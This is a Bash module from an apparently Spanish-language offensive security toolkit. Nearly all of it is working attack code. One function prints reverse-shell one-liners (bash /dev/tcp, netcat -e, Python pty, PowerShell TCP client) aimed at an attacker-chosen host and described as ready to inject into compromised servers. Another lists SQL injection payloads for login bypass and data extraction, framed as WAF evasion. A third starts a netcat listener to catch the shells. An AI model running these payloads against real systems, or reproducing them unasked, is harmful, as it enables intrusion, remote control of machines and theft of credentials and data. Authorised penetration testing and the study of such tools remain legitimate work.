#!/bin/bash

# --- MÓDULO ARMERÍA Y EXTRANET (PAYLOADS & LISTENERS) ---
# Autor: sao2139

function reverse_shell_gen() {
    echo -e "\n${CYAN}--- Generador de Reverse Shells Crudos ---${NC}"
    echo -e "${YELLOW}Genera los comandos "One-Liner" listos para ser inyectados en servidores comprometidos.${NC}"
    
    # Obtener IP local sugerida
    local ip_sug=$(hostname -I 2>/dev/null | awk '{print $1}')
    [[ -z "$ip_sug" ]] && ip_sug="192.168.1.100"
    
    read -p "IP de tu máquina atacante [$ip_sug]: " lhost
    [[ -z "$lhost" ]] && lhost="$ip_sug"
    
    read -p "Puerto local en escucha (ej. 4444): " lport
    [[ -z "$lport" ]] && lport=4444
    
    echo -e "\n${GREEN}[+] Seleccionando vectores para LHOST: $lhost | LPORT: $lport${NC}"
    
    echo -e "\n${LIGHT_GREEN}--- Bash TCP ---${NC}"
    echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
    
    echo -e "\n${LIGHT_GREEN}--- Netcat Traditional ---${NC}"
    echo "nc -e /bin/sh $lhost $lport"
    
    echo -e "\n${LIGHT_GREEN}--- Python3 ---${NC}"
    echo "export RHOST=\"$lhost\";export RPORT=$lport;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'"

    echo -e "\n${LIGHT_GREEN}--- PowerShell Ligerísimo ---${NC}"
    echo "\$client = New-Object System.Net.Sockets.TCPClient(\"$lhost\",$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback + \"PS > \");\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
    
    log_event "[Exploits] Generador de Shells invocado con parámetros LHOST: $lhost LPORT: $lport"
    echo ""
    read -p "Presiona Enter..."
}

function sql_payload_gen() {
    echo -e "\n${CYAN}--- Creador de Vectores SQLi Evasivos ---${NC}"
    echo -e "${YELLOW}Genera secuencias de escape típicas para bypassear filtros WAF deficientes.${NC}"
    
    echo -e "\n${LIGHT_GREEN}[*] Autenticación Bypass (Login):${NC}"
    echo -e "1. ${PURPLE}' OR 1=1 --${NC}"
    echo -e "2. ${PURPLE}admin' --${NC}"
    echo -e "3. ${PURPLE}\" OR \"\"=\"${NC}"
    echo -e "4. ${PURPLE}admin' #${NC}"
    
    echo -e "\n${LIGHT_GREEN}[*] Extracción Base (UNION Based):${NC}"
    echo -e "1. ${PURPLE}' UNION SELECT null, null, null --${NC}"
    echo -e "2. ${PURPLE}' UNION SELECT user, password FROM users --${NC}"
    echo -e "3. ${PURPLE}' UNION SELECT version(), user(), database() --${NC}"
    
    echo -e "\n${LIGHT_GREEN}[*] Error Based (MySQL / MSSQL):${NC}"
    echo -e "1. ${PURPLE}' AND extractvalue(rand(),concat(0x3a,version()))--${NC}"
    echo -e "2. ${PURPLE}1=CONVERT(int,(SELECT @@version))${NC}"
    
    log_event "[Exploits] Arsenal SQLi visualizado por el analista."
    echo ""
    read -p "Presiona Enter..."
}

function listener_wizard() {
    echo -e "\n${CYAN}--- Handler TCP (Escucha Activa) ---${NC}"
    echo -e "${YELLOW}Abre un puerto en tu máquina local para atrapar shells conectadas de vuelta.${NC}"
    read -p "Puerto a escuchar (ej. 4444): " port
    [[ -z "$port" ]] && return
    
    if command -v nc >/dev/null 2>&1; then
        echo -e "${GREEN}[+] Abriendo socket netcat bidireccional en puerto $port... (Ctrl+C para salir del handler)${NC}"
        log_event "[Exploits] Handler TCP levantado en el puerto local $port"
        nc -lvnp "$port"
    else
        echo -e "${RED}[!] Require 'nc' (netcat) instalado en el host local.${NC}"
    fi
    echo ""
    read -p "Presiona Enter..."
}
